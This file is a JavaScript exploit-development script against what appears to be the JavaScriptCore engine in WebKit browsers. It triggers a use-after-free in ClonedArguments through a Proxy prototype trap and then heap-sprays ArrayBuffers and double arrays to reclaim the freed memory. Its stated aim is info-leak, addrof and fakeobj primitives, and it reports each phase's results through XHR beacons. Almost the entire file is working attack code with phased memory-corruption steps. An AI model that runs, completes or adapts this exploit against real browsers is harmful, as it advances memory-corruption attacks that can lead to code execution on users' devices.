// p250 — ClonedArguments UAF: info leak + addrof primitive
// Phase 1: Trigger UAF without spray → read internal allocator data
// Phase 2: Trigger UAF with spray → identify reclaiming buffer
// Phase 3: Use identified buffer for addrof via double/contiguous confusion
// Beacon prefix: V250-

(function() {
  var B_Q = [];
  var B_ID = 0;
  function B(tag, body) {
    var id = B_ID++;
    var url = '/beacon/V250-' + tag + '?t=' + Date.now() + '&i=' + id;
    try {
      var x = new XMLHttpRequest();
      if (body && body.length < 1800) {
        x.open('GET', url + '&d=' + encodeURIComponent(body), true);
        x.send();
      } else if (body) {
        x.open('POST', url, true);
        x.send(body);
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  function hex64(lo, hi) {
    return ('00000000' + (hi >>> 0).toString(16)).slice(-8) +
           ('00000000' + (lo >>> 0).toString(16)).slice(-8);
  }

  function hexN(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  // Read raw 64-bit value from a DataView at offset
  function read64(dv, off) {
    var lo = dv.getUint32(off, true);
    var hi = dv.getUint32(off + 4, true);
    return { lo: lo, hi: hi, hex: hex64(lo, hi) };
  }

  // Write raw 64-bit value to DataView
  function write64(dv, off, lo, hi) {
    dv.setUint32(off, lo, true);
    dv.setUint32(off + 4, hi, true);
  }

  // JSValue encoding helpers (JSVALUE64 NaN-boxing)
  // Cell pointer: raw 48-bit address, upper 16 = 0x0000
  // Int32: 0xFFFE0000_IIII_IIII
  // Double: IEEE754(d) + 0x0002_0000_0000_0000
  // NotCellMask: 0xFFFE_0000_0000_0002

  function isJSValueCell(lo, hi) {
    return (hi & 0xFFFE0000) === 0 && (lo & 0x2) === 0 && (lo | hi) !== 0;
  }

  function isJSValueInt32(lo, hi) {
    return (hi & 0xFFFE0000) === 0xFFFE0000;
  }

  function isJSValueDouble(lo, hi) {
    return (hi | lo) !== 0 && !isJSValueInt32(lo, hi) && !isJSValueCell(lo, hi);
  }

  B('BOOT');

  // === PHASE 1: UAF without spray — leak allocator internals ===
  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 64;
  var leakedPtrs = [];

  try {
    B('P1-START');

    // Create args with known values
    var vals = [];
    for (var i = 0; i < NARGS; i++) vals.push(0x10000 + i);
    var args = target.apply(null, vals);

    // Create holes — these trigger the Proxy path
    delete args[3];
    delete args[7];

    var trapFired = 0;
    var handler = {
      get: function(t, prop) {
        trapFired++;
        if (trapFired === 1) {
          // Grow args to force butterfly reallocation
          // OLD butterfly (~520 bytes) is freed
          for (var j = NARGS; j < NARGS + 400; j++) {
            args[j] = 0x41414141;
          }
          B('P1-GREW');

          // Do NOT spray — let natural allocations reclaim
          // Force some JSC internal allocations
          var junk = [];
          for (var k = 0; k < 200; k++) {
            var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
            a.push(9.9, 10.1, 11.1, 12.2, 13.3, 14.4, 15.5, 16.6);
            a.push(17.7, 18.8, 19.9, 20.0, 21.1, 22.2, 23.3, 24.4);
            a.push(25.5, 26.6, 27.7, 28.8, 29.9, 30.0, 31.1, 32.2);
            a.push(33.3, 34.4, 35.5, 36.6, 37.7, 38.8, 39.9, 40.0);
            a.push(41.1, 42.2, 43.3, 44.4, 45.5, 46.6, 47.7, 48.8);
            a.push(49.9, 50.0, 51.1, 52.2, 53.3, 54.4, 55.5, 56.6);
            a.push(57.7, 58.8, 59.9, 60.0, 61.1, 62.2, 63.3, 64.4);
            junk.push(a);
          }
          B('P1-ALLOC-' + junk.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, handler));

    var result = receiver.apply(null, args);
    B('P1-RESULT-' + result.length + '-TRAP-' + trapFired);

    // Analyze returned values
    var changed = 0;
    var valReport = [];
    for (var i = 0; i < Math.min(result.length, NARGS); i++) {
      var v = result[i];
      var expected = (i === 3 || i === 7) ? undefined : (0x10000 + i);

      if (v === expected) continue;
      if (v === undefined && (i === 3 || i === 7)) continue;

      changed++;
      var desc;
      if (typeof v === 'number') {
        desc = 'n:' + hexN(v >>> 0);
        if (v > 0x100000000) {
          // Could be a pointer-like value leaked as float
          var f64 = new Float64Array(1);
          f64[0] = v;
          var u8 = new Uint8Array(f64.buffer);
          var lo = u8[0] | (u8[1]<<8) | (u8[2]<<16) | (u8[3]<<24);
          var hi = u8[4] | (u8[5]<<8) | (u8[6]<<16) | (u8[7]<<24);
          desc = 'f:' + hex64(lo >>> 0, hi >>> 0);
        }
      } else if (typeof v === 'object') {
        desc = 'obj:' + String(v).substring(0, 20);
      } else {
        desc = typeof v + ':' + String(v).substring(0, 10);
      }
      valReport.push(i + '=' + desc);
    }

    B('P1-CHANGED-' + changed, valReport.join('|'));
    if (changed > 0) B('P1-LEAK-CONFIRMED');
    else B('P1-NO-LEAK');

  } catch(e) {
    B('P1-ERR-' + e.message.substring(0, 40));
  }

  // === PHASE 2: UAF with spray — identify which buffer reclaims ===
  try {
    B('P2-START');

    var args2 = target.apply(null, vals);
    delete args2[3];
    delete args2[7];

    var sprayBufs = [];
    var sprayViews = [];
    var SPRAY_SZ = 528; // ~520 butterfly + alignment margin
    var SPRAY_N = 3000;

    var trapFired2 = 0;
    var handler2 = {
      get: function(t, prop) {
        trapFired2++;
        if (trapFired2 === 1) {
          // Grow → free old butterfly
          for (var j = NARGS; j < NARGS + 400; j++) args2[j] = 0x41414141;

          // Flush bmalloc dealloc cache
          var flush = [];
          for (var f = 0; f < 200; f++) flush.push(new ArrayBuffer(64));
          flush = null;

          // Spray ArrayBuffers to reclaim
          for (var s = 0; s < SPRAY_N; s++) {
            var ab = new ArrayBuffer(SPRAY_SZ);
            var dv = new DataView(ab);
            // Each buffer has unique tag at every 8-byte slot
            for (var off = 0; off < SPRAY_SZ - 7; off += 8) {
              // Write: 0xFFFE0000 | (s & 0xFFFF) as high, (off/8) as low
              // This makes each 8-byte slot a JSValue int32: (off/8) | (s << 16)
              // When read as JSValue int32: value = (off/8) | (s << 16)
              dv.setUint32(off, (off / 8) | ((s & 0xFFFF) << 16), true);
              dv.setUint32(off + 4, 0xFFFE0000, true);
            }
            sprayBufs.push(ab);
            sprayViews.push(dv);
          }
          B('P2-SPRAYED-' + SPRAY_N);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, handler2));

    var result2 = receiver.apply(null, args2);
    B('P2-RESULT-' + result2.length + '-TRAP-' + trapFired2);

    // Identify the reclaiming buffer
    var sprayHits = [];
    for (var i = 0; i < Math.min(result2.length, NARGS); i++) {
      if (i === 3 || i === 7) continue; // holes
      var v = result2[i];
      var expected = 0x10000 + i;
      if (v === expected) continue;

      if (typeof v === 'number' && v !== expected) {
        // Decode spray tag: high 16 of low dword = spray index
        var raw = v >>> 0;
        var slotIdx = raw & 0xFFFF;
        var sprayIdx = (raw >>> 16) & 0xFFFF;

        // The butterfly data starts after IndexingHeader (8 bytes)
        // So butterfly slot i corresponds to byte offset 8 + i*8
        // The spray data at that offset should have slot = (8 + i*8)/8 = 1 + i
        var expectedSlot = 1 + i; // IndexingHeader takes slot 0

        if (sprayIdx < SPRAY_N) {
          sprayHits.push({
            argIdx: i,
            sprayIdx: sprayIdx,
            slotIdx: slotIdx,
            expectedSlot: expectedSlot,
            raw: hexN(raw)
          });
        }
      }
    }

    B('P2-HITS-' + sprayHits.length);
    if (sprayHits.length > 0) {
      // Find consensus: which spray buffer is most common?
      var counts = {};
      for (var h = 0; h < sprayHits.length; h++) {
        var si = sprayHits[h].sprayIdx;
        counts[si] = (counts[si] || 0) + 1;
      }
      var bestIdx = -1, bestCount = 0;
      for (var k in counts) {
        if (counts[k] > bestCount) { bestCount = counts[k]; bestIdx = parseInt(k); }
      }

      B('P2-RECLAIM-BUF-' + bestIdx + '-COUNT-' + bestCount);

      // Report hit details
      var hitReport = [];
      for (var h = 0; h < Math.min(sprayHits.length, 10); h++) {
        var hit = sprayHits[h];
        hitReport.push('a' + hit.argIdx + ':s' + hit.sprayIdx + ':sl' + hit.slotIdx + ':ex' + hit.expectedSlot);
      }
      B('P2-DETAIL', hitReport.join('|'));

      // === PHASE 3: Use identified buffer for addrof ===
      if (bestIdx >= 0 && bestIdx < SPRAY_N) {
        B('P3-START');

        var reclaimBuf = sprayBufs[bestIdx];
        var reclaimDV = new DataView(reclaimBuf);

        // Now we know: reclaimBuf's data pointer == old butterfly memory address
        // The stale read of the butterfly returns data from reclaimBuf

        // Trigger ANOTHER UAF, but this time:
        // 1. Put a target object (whose address we want) in the ClonedArguments
        // 2. Spray a DIFFERENT set of buffers to reclaim the NEW freed butterfly
        // 3. But write the RECLAIM buffer with data that helps us
        // Before second UAF: write controlled data into reclaimBuf

        // Actually, the reclaim buffer was from the first UAF. For a second UAF,
        // we need a NEW ClonedArguments with a NEW butterfly that gets freed.
        // The new freed butterfly is at a DIFFERENT address, needing different reclaim.

        // APPROACH: Use the first UAF's reclaim for phase 3 directly
        // Write data into reclaimBuf → it IS the butterfly memory for args2
        // But args2's stale read already happened (receiver.apply returned)

        // We need to trigger a THIRD UAF where the butterfly happens to be
        // at the same location as reclaimBuf... or use a different approach.

        // APPROACH B: Use multiple sequential UAFs
        // For each UAF, we identify the reclaim buffer
        // On the SECOND UAF, we write fake JSValues into the reclaim buffer
        // BEFORE the UAF trigger, so they're ready when the stale read happens

        // Hmm, but we need to write BEFORE the UAF, not after.
        // The spray happens INSIDE the Proxy trap (before the stale reads continue).
        // So: in the trap, we write our fake data into spray buffers, then spray.

        // PHASE 3: Double/contiguous confusion via UAF
        //
        // We create a Float64Array and an object, both as ClonedArguments entries
        // The butterfly stores them as JSValues (cell pointers)
        // We trigger UAF and spray with double-valued buffers
        // The stale read interprets spray doubles as JSValues
        // If a spray double's IEEE754 bits match a cell pointer pattern → fakeobj
        //
        // For addrof: opposite direction. We need pointer bits read as double.
        // ClonedArguments stores target object pointer in butterfly.
        // After UAF, if the memory ISN'T reclaimed, stale read returns the same object.
        // If it IS reclaimed, stale read returns spray data.
        //
        // KEY: Don't spray over the target's slot. Spray over OTHER slots with marker.
        // Read target slot from unreclaimed memory → still the object (not address).
        //
        // ALTERNATIVE: Write reclaimBuf such that position i has DoubleEncodeOffset-adjusted
        // representation of the pointer. When read as JSValue, the bits decode to a double
        // whose IEEE754 value, when converted, gives us the address.
        //
        // Actually: if we know which buffer reclaimed, we can READ its contents
        // BEFORE the UAF trigger to see the old butterfly data!
        // But reclaimBuf was written by our spray — overwriting the old data.

        // Let's try Phase 3b: a CLEAN UAF without spray to preserve old butterfly data
        B('P3-NOSPRAY-START');

        // Create a test object whose address we want to leak
        var leakTarget = { marker: 0xCAFE, x: 1, y: 2, z: 3 };

        // Create args with the target object AND known ints
        var args3 = (function() {
          return arguments;
        })(0x30001, 0x30002, leakTarget, 0x30004, 0x30005, 0x30006, 0x30007, 0x30008,
           0x30009, 0x3000A, 0x3000B, 0x3000C, 0x3000D, 0x3000E, 0x3000F, 0x30010,
           0x30011, 0x30012, 0x30013, 0x30014, 0x30015, 0x30016, 0x30017, 0x30018,
           0x30019, 0x3001A, 0x3001B, 0x3001C, 0x3001D, 0x3001E, 0x3001F, 0x30020,
           0x30021, 0x30022, 0x30023, 0x30024, 0x30025, 0x30026, 0x30027, 0x30028,
           0x30029, 0x3002A, 0x3002B, 0x3002C, 0x3002D, 0x3002E, 0x3002F, 0x30030,
           0x30031, 0x30032, 0x30033, 0x30034, 0x30035, 0x30036, 0x30037, 0x30038,
           0x30039, 0x3003A, 0x3003B, 0x3003C, 0x3003D, 0x3003E, 0x3003F, 0x30040);
        // leakTarget is at index 2

        delete args3[5]; // hole

        var trapFired3 = 0;
        var handler3 = {
          get: function(t, prop) {
            trapFired3++;
            if (trapFired3 === 1) {
              // Grow → free old butterfly
              for (var j = NARGS; j < NARGS + 400; j++) args3[j] = 0x42424242;
              B('P3-GREW');
              // NO spray — let old data persist
            }
            return undefined;
          }
        };

        Object.setPrototypeOf(args3, new Proxy({}, handler3));

        var result3 = receiver.apply(null, args3);
        B('P3-RESULT-' + result3.length);

        // Check index 2 — should still be leakTarget (same object)
        var v2 = result3[2];
        B('P3-IDX2-TYPE-' + typeof v2);
        if (v2 === leakTarget) {
          B('P3-IDX2-SAME-OBJ');
        } else if (typeof v2 === 'number') {
          B('P3-IDX2-NUM-' + hexN(v2 >>> 0));
          // If it's a number, the memory was overwritten
          // Check if it could be a double encoding of a pointer
          var f = new Float64Array(1);
          f[0] = v2;
          var bytes = new Uint8Array(f.buffer);
          var lo = bytes[0]|(bytes[1]<<8)|(bytes[2]<<16)|(bytes[3]<<24);
          var hi = bytes[4]|(bytes[5]<<8)|(bytes[6]<<16)|(bytes[7]<<24);
          B('P3-IDX2-RAW-' + hex64(lo>>>0, hi>>>0));
        } else if (typeof v2 === 'object' && v2 !== leakTarget) {
          // Different object! This means memory was reclaimed by an internal allocation
          B('P3-IDX2-DIFF-OBJ-' + String(v2).substring(0, 30));
        } else {
          B('P3-IDX2-OTHER-' + typeof v2);
        }

        // Check ALL indices for changes
        var p3Changed = 0;
        var p3Report = [];
        for (var i = 0; i < Math.min(result3.length, NARGS); i++) {
          if (i === 5) continue; // hole
          var v = result3[i];
          var exp;
          if (i === 2) exp = leakTarget;
          else exp = 0x30001 + i;

          if (v !== exp) {
            p3Changed++;
            var d;
            if (typeof v === 'number') {
              if (v > 0x100000000 || v < 0) {
                var ff = new Float64Array(1);
                ff[0] = v;
                var bb = new Uint8Array(ff.buffer);
                var llo = bb[0]|(bb[1]<<8)|(bb[2]<<16)|(bb[3]<<24);
                var hhi = bb[4]|(bb[5]<<8)|(bb[6]<<16)|(bb[7]<<24);
                d = 'f:' + hex64(llo>>>0, hhi>>>0);
              } else {
                d = 'n:' + hexN(v >>> 0);
              }
            } else if (typeof v === 'object') {
              d = v === leakTarget ? 'SAME' : ('obj:' + Object.keys(v || {}).join(',').substring(0, 20));
            } else if (v === undefined) {
              d = 'undef';
            } else {
              d = typeof v;
            }
            p3Report.push(i + '=' + d);
          }
        }

        B('P3-NOSPRAY-CHANGED-' + p3Changed, p3Report.join('|'));

        // === PHASE 4: Try to get address via controlled reclaim ===
        // Trigger UAF with specific spray: at index 2 (where leakTarget was),
        // DON'T overwrite (leave original pointer bytes), but overwrite OTHER slots
        // with markers. If the stale read at index 2 returns the object (no overwrite),
        // and markers appear at other indices, we've confirmed partial control.

        B('P4-START');

        var args4 = (function() {
          return arguments;
        })(0x40001, 0x40002, leakTarget, 0x40004, 0x40005, 0x40006, 0x40007, 0x40008,
           0x40009, 0x4000A, 0x4000B, 0x4000C, 0x4000D, 0x4000E, 0x4000F, 0x40010,
           0x40011, 0x40012, 0x40013, 0x40014, 0x40015, 0x40016, 0x40017, 0x40018,
           0x40019, 0x4001A, 0x4001B, 0x4001C, 0x4001D, 0x4001E, 0x4001F, 0x40020,
           0x40021, 0x40022, 0x40023, 0x40024, 0x40025, 0x40026, 0x40027, 0x40028,
           0x40029, 0x4002A, 0x4002B, 0x4002C, 0x4002D, 0x4002E, 0x4002F, 0x40030,
           0x40031, 0x40032, 0x40033, 0x40034, 0x40035, 0x40036, 0x40037, 0x40038,
           0x40039, 0x4003A, 0x4003B, 0x4003C, 0x4003D, 0x4003E, 0x4003F, 0x40040);

        delete args4[7]; // hole

        var sprayBufs4 = [];
        var trapFired4 = 0;
        var handler4 = {
          get: function(t, prop) {
            trapFired4++;
            if (trapFired4 === 1) {
              for (var j = NARGS; j < NARGS + 400; j++) args4[j] = 0x43434343;
              B('P4-GREW');

              // Spray, but with DOUBLE arrays (not ArrayBuffers)
              // Double arrays allocate butterflies from aux space = same as freed butterfly
              for (var s = 0; s < 2000; s++) {
                // Create double array with 64 elements → butterfly ~520 bytes from aux space
                var a = new Array(64);
                for (var k = 0; k < 64; k++) {
                  // Store a double whose IEEE754 bits encode a recognizable int32 JSValue
                  // 0xFFFE0000 | (s & 0xFFFF) in high, k in low → JSValue int32 = k | (s<<16)
                  // But doubles store raw IEEE754, while contiguous stores JSValues
                  // So we write doubles whose raw bits ARE our desired JSValue encoding

                  // We want the raw 64 bits at butterfly slot k to be:
                  // 0xFFFE0000_(k | (s << 16)) → this is the JSValue int32 encoding
                  // As IEEE754: this is a NaN with payload → viewed as double = NaN (not useful)

                  // Instead, let's use a simpler pattern:
                  // Store double = s + k/1000 → raw bits are distinct per (s,k)
                  a[k] = s + k * 0.001;
                }
                sprayBufs4.push(a);
              }
              B('P4-SPRAYED-2000');
            }
            return undefined;
          }
        };

        Object.setPrototypeOf(args4, new Proxy({}, handler4));

        var result4 = receiver.apply(null, args4);
        B('P4-RESULT-' + result4.length);

        var p4Changed = 0;
        var p4Report = [];
        for (var i = 0; i < Math.min(result4.length, NARGS); i++) {
          if (i === 7) continue;
          var v = result4[i];
          var exp;
          if (i === 2) exp = leakTarget;
          else exp = 0x40001 + i;

          if (v !== exp) {
            p4Changed++;
            var d;
            if (typeof v === 'number') {
              var ff = new Float64Array(1);
              ff[0] = v;
              var bb = new Uint8Array(ff.buffer);
              var llo = bb[0]|(bb[1]<<8)|(bb[2]<<16)|(bb[3]<<24);
              var hhi = bb[4]|(bb[5]<<8)|(bb[6]<<16)|(bb[7]<<24);
              d = 'f:' + hex64(llo>>>0, hhi>>>0);
              if (v !== v) d = 'NaN:' + hex64(llo>>>0, hhi>>>0);
            } else if (typeof v === 'object') {
              if (v === leakTarget) d = 'TARGET';
              else if (v === null) d = 'null';
              else d = 'OBJ';
            } else if (v === undefined) {
              d = 'undef';
            } else if (typeof v === 'string') {
              d = 'str:' + v.substring(0, 10);
            } else {
              d = typeof v;
            }
            if (p4Report.length < 15) p4Report.push(i + '=' + d);
          }
        }

        B('P4-CHANGED-' + p4Changed, p4Report.join('|'));

        // Check if index 2 returned the target object or something else
        var v2_4 = result4[2];
        if (v2_4 === leakTarget) {
          B('P4-TARGET-SURVIVED');
        } else if (typeof v2_4 === 'number') {
          // The pointer bytes were overwritten by spray doubles!
          // The double's IEEE754 bits were interpreted as a JSValue
          // If the bits look like an int32, we get a number
          B('P4-TARGET-REPLACED-NUM-' + v2_4);
          var ff = new Float64Array(1);
          ff[0] = v2_4;
          var bb = new Uint8Array(ff.buffer);
          var lo = bb[0]|(bb[1]<<8)|(bb[2]<<16)|(bb[3]<<24);
          var hi = bb[4]|(bb[5]<<8)|(bb[6]<<16)|(bb[7]<<24);
          B('P4-TARGET-RAW-' + hex64(lo>>>0, hi>>>0));
        } else if (typeof v2_4 === 'object' && v2_4 !== null && v2_4 !== leakTarget) {
          // A DIFFERENT object was returned — the spray's double was interpreted as a pointer!
          // THIS IS FAKEOBJ — we accidentally got a pointer to spray data
          B('P4-FAKEOBJ-HIT');
          try {
            B('P4-FAKEOBJ-KEYS-' + Object.keys(v2_4).join(',').substring(0, 40));
          } catch(e) {
            B('P4-FAKEOBJ-ACCESS-ERR-' + e.message.substring(0, 30));
          }
        }
      }
    } else {
      B('P2-NO-RECLAIM');
    }
  } catch(e) {
    B('P2-ERR-' + e.message.substring(0, 60));
  }

  B('DONE');
})();
